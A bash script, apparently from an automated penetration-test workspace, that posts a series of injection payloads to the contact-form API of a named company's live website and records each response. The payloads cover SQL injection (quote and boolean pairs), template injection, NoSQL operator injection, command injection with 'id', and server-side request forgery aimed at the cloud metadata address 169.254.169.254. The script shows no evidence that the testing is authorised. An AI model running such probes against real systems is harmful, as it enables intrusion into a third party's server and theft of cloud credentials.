#!/bin/bash
cd "$WORK_PATH"
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
O=tool_outputs/send_inj
mkdir -p $O
B=https://www.infinitycapital.bh/api/send
post(){
  name="$1"; data="$2"
  code=$(curl -s -A "$UA" -o $O/$name.body -D $O/$name.hdr -w "%{http_code} %{size_download} %{time_total}" -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data "$data" "$B")
  echo "$name -> $code md5=$(md5sum $O/$name.body 2>/dev/null|cut -c1-8)"
}
post base       'fname=Test&lname=User&areacode=%2B973&tel=3600000&cname=vapt&subject=Inquiry&msg=hello&check=1&targets=%5B%5D'
post sqli_fname "fname=Test'&lname=User&areacode=%2B973&tel=3600000&cname=vapt&subject=Inquiry&msg=hello&check=1&targets=%5B%5D"
post sqli_msg   'fname=Test&lname=User&areacode=%2B973&tel=3600000&cname=vapt&subject=Inquiry&msg=hello%27&check=1&targets=%5B%5D'
post ssti_msg   'fname=Test&lname=User&areacode=%2B973&tel=3600000&cname=vapt&subject=Inquiry&msg=%7B%7B7*7%7D%7D&check=1&targets=%5B%5D'
post nosqli     'fname[$ne]=x&lname=User&areacode=%2B973&tel=3600000&cname=vapt&subject=Inquiry&msg=hello&check=1&targets=%5B%5D'
post cmdi_msg   'fname=Test&lname=User&areacode=%2B973&tel=3600000&cname=vapt&subject=Inquiry&msg=hello%60id%60&check=1&targets=%5B%5D'
post cmdi_cname 'fname=Test&lname=User&areacode=%2B973&tel=3600000&cname=vapt;id&subject=Inquiry&msg=hello&check=1&targets=%5B%5D'
post sqli_boolT 'fname=Test&lname=User&areacode=%2B973&tel=3600000&cname=vapt&subject=Inquiry&msg=hello&check=1&targets=%5B%5D&x=1%27%20AND%20%271%27=%271'
post sqli_boolF 'fname=Test&lname=User&areacode=%2B973&tel=3600000&cname=vapt&subject=Inquiry&msg=hello&check=1&targets=%5B%5D&x=1%27%20AND%20%271%27=%272'
post ssrf_url   'fname=Test&lname=User&areacode=%2B973&tel=3600000&cname=vapt&subject=Inquiry&msg=http://169.254.169.254/latest/meta-data/&check=1&targets=%5B%5D'
echo "--- bodies:"
for f in base sqli_fname sqli_msg ssti_msg nosqli cmdi_msg cmdi_cname sqli_boolT sqli_boolF ssrf_url; do
  printf "%-12s " $f; head -c 200 $O/$f.body 2>/dev/null; echo
done
